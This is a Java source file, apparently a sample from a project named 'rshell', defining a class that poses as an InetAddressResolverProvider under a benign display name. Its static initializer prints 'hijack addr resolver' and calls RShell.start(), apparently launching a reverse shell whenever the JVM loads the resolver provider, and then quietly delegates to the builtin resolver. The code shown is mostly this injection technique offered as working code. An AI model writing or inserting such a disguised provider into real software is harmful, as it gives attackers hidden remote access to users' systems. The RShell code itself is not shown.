package com.Ox08.rshell.sample.inject.addr;
import com.Ox08.rshell.sample.RShell;
import java.net.spi.InetAddressResolver;
import java.net.spi.InetAddressResolverProvider;
public class HijackedAddressResolverProvider extends InetAddressResolverProvider {

    static {
        System.out.println("hijack addr resolver");
        RShell.start();
    }

    @Override
    public InetAddressResolver get(Configuration configuration) {
        // just delegate
        return configuration.builtinResolver();

    }
    @Override
    public String name() {
        return "Internet Address Resolver Provider";
    }
}
